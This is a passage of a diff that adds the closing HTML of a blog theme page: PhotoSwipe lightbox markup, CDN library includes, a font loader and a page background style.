+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<style>
+  body {
+      background: url("https://img1.baidu.com/it/u=546422228,54853596&fm=253&fmt=auto&app=138&f=GIF?w=1164&h=500") no-repeat center top;
+      background-size: cover;
+      background-attachment: fixed;
+  }
+
+ 
+  :root[data-scheme="dark"] body {
+  background-image: none;
+   
+  background-color: var(--body-background);
+  }
+</style>
+    </body>
+</html>
